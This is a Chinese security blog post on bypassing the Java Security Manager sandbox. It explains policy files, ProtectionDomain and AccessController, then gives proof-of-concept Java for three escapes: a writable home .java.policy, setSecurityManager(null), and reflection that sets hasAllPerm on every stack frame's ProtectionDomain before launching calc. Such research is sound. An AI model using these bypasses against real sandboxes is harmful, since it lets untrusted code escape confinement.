<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>攻击Java沙箱 | c0d3p1ut0s</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
ga('create','UA-111240445-1','auto');ga('send','pageview');</script></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">攻击Java沙箱</h1><a id="logo" href="/.">c0d3p1ut0s</a><p class="description">程序员 安全  codeplutos</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">攻击Java沙箱</h1><div class="post-meta">Jul 11, 2018<script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span></div><a data-disqus-identifier="攻击Java沙箱/" href="/攻击Java沙箱/#disqus_thread" class="disqus-comment-count"></a><div class="post-content"><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><blockquote>
<p>文章原发<a href="https://www.anquanke.com/post/id/151398" target="_blank" rel="noopener">安全客</a>，重发博客如下</p>
</blockquote>
<p>最近两年CTF比赛中出现了Python沙箱绕过，关于Python沙盒的文章比较多，其实Java也有沙箱。而恰好笔者在做安全测试的时候遇到了Java沙箱，于是研究了一下Java沙箱的绕过。虽然Java不像PHP和python那么灵活，但是Java沙箱能玩的地方还是挺多的。</p>
<a id="more"></a>
<p>文章脑图如下，<strong>配合食用效果更佳</strong>。有错误或者疏漏的地方请各位指出，欢迎联系<a href="mailto:c0d3p1ut0s@gmail.com" target="_blank" rel="noopener">c0d3p1ut0s@gmail.com</a>。</p>
<p><img src="https://i.loli.net/2018/07/10/5b449b9daaa3e.png" alt=""></p>
<h3 id="0x01-Java沙箱"><a href="#0x01-Java沙箱" class="headerlink" title="0x01 Java沙箱"></a>0x01 Java沙箱</h3><p>Java沙箱由以下部分组成：</p>
<ul>
<li>类加载器结构（例如命名空间）</li>
<li>class文件校验器</li>
<li>内置于Java虚拟机（和Java语言）的安全特性（例如对指针操作的屏蔽等）</li>
<li>Java安全管理器（Java Security Manager）和Java API组成</li>
</ul>
<p>前三个基本都是<strong>内置</strong>实现在JVM和Java语言中的，只有Java安全管理器（Java Security Manager）是能被开发者控制的，用来保护系统不被JVM中恶意的代码破坏的。这样，<strong>绕过java沙箱其实就转化成绕过java security manager</strong>。</p>
<p>Java Security Manager的一个典型应用场景是jvm需要加载运行一段代码，但是这段代码是不可信的，例如来自用户的输入、上传、反序列化指定的bytecode或者来自网络远程加载，这种情况下，需要防止不可信来源的恶意代码对系统造成破坏。其实这就是沙箱的应用场景。</p>
<h3 id="0x02-Java-Security-Manager介绍"><a href="#0x02-Java-Security-Manager介绍" class="headerlink" title="0x02 Java Security Manager介绍"></a>0x02 Java Security Manager介绍</h3><p>在java后面加一个参数即可打开Java Security Manager，<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.security.manager</span><br></pre></td></tr></table></figure></p>
<p>java提供了默认的Java Security Manager实现类，如果你想自定义自己的实现，可以在java.security.manager加等号指定。例如：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager=net.sourceforge.prograde.sm.ProGradeJSM</span><br></pre></td></tr></table></figure></p>
<p>这样就指定了net.sourceforge.prograde.sm.ProGradeJSM作为实现，在绝大多数情况下，我们都使用原生的实现，一些第三方实现也只是扩展了策略文件的功能而已，那么什么是策略文件呢？</p>
<p>策略(policy)文件是一个配置文件，指定了哪些类有哪些权限。指定策略文件的命令如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy=./security.policy -jar a.jar</span><br></pre></td></tr></table></figure></p>
<p>一般我们需要指定哪些类有哪些权限，编辑policy文件就可以了。</p>
<p>上面说了，policy文件的作用是指定哪些类有哪些权限。policy怎么指定这些类的呢？指定类名吗？并不是，policy文件根据<code>类的url和类的签名</code>来确定类，指定权限，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">grant signedBy &quot;Duke&quot; &#123;</span><br><span class="line">    permission java.io.FilePermission &quot;/tmp/*&quot;, &quot;read,write&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">grant  codeBase &quot;file:/home/sysadmin/*&quot; &#123;</span><br><span class="line">    permission java.security.SecurityPermission &quot;Security.insertProvider.*&quot;;</span><br><span class="line">    permission java.security.SecurityPermission &quot;Security.removeProvider.*&quot;;</span><br><span class="line">    permission java.security.SecurityPermission &quot;Security.setProperty.*&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>policy文件的具体语法参看<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/security/PolicyFiles.html" target="_blank" rel="noopener">这里</a>。</p>
<p>根据java的设计，一个类的url和签名组成了这个类的CodeSource，根据policy文件的配置，一个CodeSource有一定的权限。一个类的CodeSource和它的权限构成了这个类的ProtectionDomain。如下图</p>
<p><img src="https://i.loli.net/2018/07/10/5b449bdc3073a.png" alt="protectiondomain.PNG"></p>
<p><img src="https://i.loli.net/2018/07/10/5b449c071e6e2.png" alt="2ProtectionDomain.png"></p>
<p>一个类的ProtectionDomain在这个类加载的时候初始化，在java.lang.ClassLoader中：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, off, len, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里调用了defineClass(null, b, off, len, null)，最后一个参数null是ProtectionDomain的值，这个函数的实现如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len,</span><br><span class="line">                                     ProtectionDomain protectionDomain)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    protectionDomain = preDefineClass(name, protectionDomain);<span class="comment">//初始化这个类的ProtectionDomain</span></span><br><span class="line">    String source = defineClassSourceLocation(protectionDomain);</span><br><span class="line">    Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);</span><br><span class="line">    postDefineClass(c, protectionDomain);</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>一个类的ProtectionDomain我们已经搞清楚了，那么ProtectionDomain有什么用？Java Security Manager是怎么做安全监测的呢？</p>
<p>当调用一个需要权限的类时，例如读写文件、执行命令、开关socket等。这个类会调用SecurityManager.checkXXX()，如果SecurityManager判定有权限，这个方法会默默返回，否则抛出安全异常。以读文件FileInputStream为例<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FileInputStream</span><span class="params">(File file)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">    String name = (file != <span class="keyword">null</span> ? file.getPath() : <span class="keyword">null</span>);</span><br><span class="line">    SecurityManager security = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">        security.checkRead(name);<span class="comment">//权限检查</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (file.isInvalid()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FileNotFoundException(<span class="string">"Invalid file path"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fd = <span class="keyword">new</span> FileDescriptor();</span><br><span class="line">    fd.attach(<span class="keyword">this</span>);</span><br><span class="line">    path = name;</span><br><span class="line">    open(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>读文件是SecurityManager.checkRead方法，写文件是SecurityManager.checkWrite方法，这些checkXXX方法最后都会调用SecurityManager.checkPermission方法，调用链如下图所示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager.checkXXX()</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">·······</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">SecurityManager.checkPermission()</span><br><span class="line">    | 在默认的Security Manager实现中</span><br><span class="line">    V</span><br><span class="line">AccessController.checkPermission()</span><br></pre></td></tr></table></figure></p>
<p>如上图，在默认的Security Manager实现中，真正的检查权限这个操作是由AccessController.checkPermission()这个方法实现的。下面我们来看看权限是怎么检查的。</p>
<p>当AccessController.checkPermission()被调用时，AccessController会自顶向下遍历当前栈（入栈到栈顶），栈由栈帧组成，每一个栈帧都是一个方法调用形成的，每个方法都属于一个类，每个类都有一个ProtectionDomain，则一个栈帧对应一个ProtectionDomain。AccessController遍历栈帧，如果某个栈帧对应的ProtectionDomain没有check的权限，则抛出异常。</p>
<p>同时，为了解决某些问题，AccessController还提供了doPrivilege方法，当这个方法被调用时，AccessController亦会自顶向下遍历当前栈，不过只会遍历到调用doPrivileged方法的栈帧就会停止。例如Main.main调用Class1.fun1()，Class1.fun1()调用了doPrivileged方法，在doPrivileged方法中进行了一些操作，AccessController的检查只会遍历到Class1.fun1()，看Class1是否有权限。</p>
<p>很明显，doPrivileged是非常危险的，因为它截断了AccessController的检查。之前Java Security Manager出过的几次漏洞都跟jdk类库不当调用doPrivileged方法，而doPrivileged方法中执行的操作能被用户代码控制有关。因为默认情况下，jdk类库是有所有权限的，即使调用jdk的用户代码没有权限，AccessController也不会再向下检查了。</p>
<h3 id="0x03-Java-Security-Manager的绕过"><a href="#0x03-Java-Security-Manager的绕过" class="headerlink" title="0x03 Java Security Manager的绕过"></a>0x03 Java Security Manager的绕过</h3><p>在某些情况下，赋予某些权限时，恶意代码可以利用这些权限，导致Java Security Manager完全失效。下面我们看看一些实例</p>
<h4 id="单等号-home目录可写导致Java-Security-Manager绕过"><a href="#单等号-home目录可写导致Java-Security-Manager绕过" class="headerlink" title="单等号+home目录可写导致Java Security Manager绕过"></a>单等号+home目录可写导致Java Security Manager绕过</h4><p>jre/lib/security/java.security是java中指定安全配置文件，在配置文件中指定了两个默认的policy文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># The default is to have a single system-wide policy file,</span><br><span class="line"># and a policy file in the user&apos;s home directory.</span><br><span class="line">policy.url.1=file:$&#123;java.home&#125;/lib/security/java.policy</span><br><span class="line">policy.url.2=file:$&#123;user.home&#125;/.java.policy</span><br></pre></td></tr></table></figure></p>
<p>而通过<code>-Djava.security.policy</code>指定policy文件时，如果参数后面是一个等号，例如<code>-Djava.security.policy=java.policy</code>，java.policy会加在上面的两个policy文件之后。在默认情况下，家目录下没有.java.policy这个文件，如果家目录可写，则恶意代码可以通过写.java.policy文件，授予自己更多的权限来绕过Java Security Manager。如下图所示，policy文件没有赋予文件的执行权限，却执行calc成功，成功绕过java security manager机制，逃逸沙箱。</p>
<p>java.policy:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.io.FilePermission &quot;C:\\Users\\Administrator\\-&quot;, &quot;read,write&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/07/10/5b449c075d9e4.png" alt="rewrite-home-policy.PNG"></p>
<p>exp代码：<a href="https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/rewrite-home-policy" target="_blank" rel="noopener">https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/rewrite-home-policy</a></p>
<p>修复方法：<code>-Djava.security.policy==java.policy</code>，用双等于号指定policy文件。</p>
<h4 id="通过setSecurityManager绕过Java-Security-Manager"><a href="#通过setSecurityManager绕过Java-Security-Manager" class="headerlink" title="通过setSecurityManager绕过Java Security Manager"></a>通过setSecurityManager绕过Java Security Manager</h4><p>java security manager不仅能通过参数<code>-Djava.security.policy==java.policy</code>指定，还可以在运行时通过<code>System.setSecurityManager()</code>方法指定。如果被授予setSecurityManager权限，恶意代码可以在运行时调用setSecurityManager方法，将java security manager置为null，绕过Java Security Manager。</p>
<p>java.policy如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;setSecurityManager&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>绕过poc<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setSecurityManager(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure></p>
<p>如下图所示，同样policy文件没有赋予文件的执行权限，却执行calc成功，成功绕过java security manager机制，逃逸沙箱。</p>
<p>java.policy:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;setSecurityManager&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/07/10/5b449c0760127.png" alt="set-security-manager.PNG"></p>
<p>exp代码：<a href="https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/set-security-manager" target="_blank" rel="noopener">https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/set-security-manager</a></p>
<p>修复方法：不授予不可信的代码setSecurityManager权限。</p>
<h4 id="通过反射绕过Java-Security-Manager"><a href="#通过反射绕过Java-Security-Manager" class="headerlink" title="通过反射绕过Java Security Manager"></a>通过反射绕过Java Security Manager</h4><p>如果读者跟了上面的<code>System.setSecurityManager</code>这个方法的话，可以看到这个方法最后直接把参数直接赋予了System类中的security变量。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setSecurityManager0</span><span class="params">(<span class="keyword">final</span> SecurityManager s)</span> </span>&#123;</span><br><span class="line">        SecurityManager sm = getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (sm != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// ask the currently installed security manager if we</span></span><br><span class="line">            <span class="comment">// can replace it.</span></span><br><span class="line">            sm.checkPermission(<span class="keyword">new</span> RuntimePermission</span><br><span class="line">                                     (<span class="string">"setSecurityManager"</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((s != <span class="keyword">null</span>) &amp;&amp; (s.getClass().getClassLoader() != <span class="keyword">null</span>)) &#123;</span><br><span class="line">            <span class="comment">// New security manager class is not on bootstrap classpath.</span></span><br><span class="line">            <span class="comment">// Cause policy to get initialized before we install the new</span></span><br><span class="line">            <span class="comment">// security manager, in order to prevent infinite loops when</span></span><br><span class="line">            <span class="comment">// trying to initialize the policy (which usually involves</span></span><br><span class="line">            <span class="comment">// accessing some security and/or system properties, which in turn</span></span><br><span class="line">            <span class="comment">// calls the installed security manager's checkPermission method</span></span><br><span class="line">            <span class="comment">// which will loop infinitely if there is a non-system class</span></span><br><span class="line">            <span class="comment">// (in this case: the new security manager class) on the stack).</span></span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction&lt;Object&gt;() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    s.getClass().getProtectionDomain().implies</span><br><span class="line">                        (SecurityConstants.ALL_PERMISSION);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        security = s;<span class="comment">//赋值在这里~</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>如果被赋予了反射权限，那么是否能通过反射直接把security置为null，使java security manager失效呢？我们试验一下：</p>
<p>java.policy如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.lang.reflect.ReflectPermission &quot;suppressAccessChecks&quot;;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;accessDeclaredMembers&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>反射代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setSecurityByReflection</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class clz = Class.forName(<span class="string">"java.lang.System"</span>);</span><br><span class="line">        Field field=clz.getDeclaredField(<span class="string">"security"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(System.class,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>竟然报异常<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.lang.NoSuchFieldException: security</span><br><span class="line">	at java.lang.Class.getDeclaredField(Class.java:<span class="number">2070</span>)</span><br><span class="line">	at evil.Poc.setSecurityByReflection(Poc.java:<span class="number">35</span>)</span><br><span class="line">	at evil.Poc.main(Poc.java:<span class="number">16</span>)</span><br></pre></td></tr></table></figure></p>
<p>不科学啊，反复试了几次，发现java.lang.System中其他变量都可以反射，就security变量不行。（这个坑调试了一下午=_=||）</p>
<p>不死心，跟了一下getDeclaredField方法，发现在sun.reflect.Reflection中定义了一个fieldFilterMap，指定了几个禁止反射的变量。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    HashMap var0 = <span class="keyword">new</span> HashMap();</span><br><span class="line">    var0.put(Reflection.class, <span class="keyword">new</span> String[]&#123;<span class="string">"fieldFilterMap"</span>, <span class="string">"methodFilterMap"</span>&#125;);</span><br><span class="line">    var0.put(System.class, <span class="keyword">new</span> String[]&#123;<span class="string">"security"</span>&#125;);</span><br><span class="line">    var0.put(Class.class, <span class="keyword">new</span> String[]&#123;<span class="string">"classLoader"</span>&#125;);</span><br><span class="line">    fieldFilterMap = var0;</span><br><span class="line">    methodFilterMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>其中就包括System.class中的security变量以及fieldFilterMap本身。在getDeclaredField中，调用了过滤fields的方法，过滤了这些变量。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Field[] filterFields(Class&lt;?&gt; var0, Field[] var1) &#123;</span><br><span class="line">    <span class="keyword">return</span> fieldFilterMap == <span class="keyword">null</span>?var1:(Field[])((Field[])filter(var1, (String[])fieldFilterMap.get(var0)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>看来，通过反射直接修改security是不行的了。这游戏真难。</p>
<p>然而，java的反射何其强大，既然负责检查的检察官java security manager不可修改，那我就修改你检查的材料–ProtectionDomain。于是我看了一下ProtectionDomain类：<br>java.security.ProtectionDomain<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProtectionDomain</span> </span>&#123;</span><br><span class="line">    <span class="comment">//.....省略部分代码</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// Set up JavaSecurityAccess in SharedSecrets</span></span><br><span class="line">        SharedSecrets.setJavaSecurityAccess(<span class="keyword">new</span> JavaSecurityAccessImpl());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* CodeSource */</span></span><br><span class="line">    <span class="keyword">private</span> CodeSource codesource ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ClassLoader the protection domain was consed from */</span></span><br><span class="line">    <span class="keyword">private</span> ClassLoader classloader;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Principals running-as within this protection domain */</span></span><br><span class="line">    <span class="keyword">private</span> Principal[] principals;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* the rights this protection domain is granted */</span></span><br><span class="line">    <span class="keyword">private</span> PermissionCollection permissions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* if the permissions object has AllPermission */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> hasAllPerm = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* the PermissionCollection is static (pre 1.4 constructor)</span></span><br><span class="line"><span class="comment">       or dynamic (via a policy refresh) */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> staticPermissions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....省略部分代码</span></span><br></pre></td></tr></table></figure></p>
<p>如前面所说，一个类的CodeSource和permissions构成了这个类的ProtectionDomain，亦可通过这里来验证。仔细看一遍，发现hasAllPerm可能是个软柿子，应该是一个标记这个类是否有所有权限的布尔变量。利用反射，把它置为true应当可以使当前类获取所有权限。</p>
<p>但是AccessController会沿着栈自顶向下检查，必须所有栈帧都有权限才能通过。不慌，那我们也遍历所有栈帧，将所有栈帧中的所有类的ProtectionDomain中的hasAllPerm置为true。代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setHasAllPerm</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();</span><br><span class="line">    <span class="comment">//遍历栈帧</span></span><br><span class="line">    <span class="keyword">for</span> (StackTraceElement stackTraceElement : stackTraceElements) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//反射当前栈帧中的类</span></span><br><span class="line">            Class clz = Class.forName(stackTraceElement.getClassName());</span><br><span class="line">            Field field = clz.getProtectionDomain().getClass().getDeclaredField(<span class="string">"hasAllPerm"</span>);</span><br><span class="line">            <span class="comment">//压制java的访问检查</span></span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">//把hasAllPerm置为true</span></span><br><span class="line">            field.set(clz.getProtectionDomain(), <span class="keyword">true</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    exec(<span class="string">"calc"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
